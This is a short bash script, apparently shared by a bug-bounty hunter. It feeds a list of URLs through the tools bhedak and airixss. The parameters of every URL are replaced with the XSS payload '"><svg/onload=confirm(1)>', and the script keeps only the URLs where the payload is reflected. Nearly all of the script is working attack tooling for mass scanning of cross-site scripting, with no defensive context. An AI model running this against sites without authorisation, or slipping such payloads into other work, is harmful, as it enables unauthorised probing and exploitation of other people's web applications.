#!/bin/bash
#Coded by @lemosnlmb

list=$1

cat $list | bhedak '"><svg/onload=confirm(1)>' | airixss -p "confirm(1)" | grep -v "Not Vulnerable to XSS"
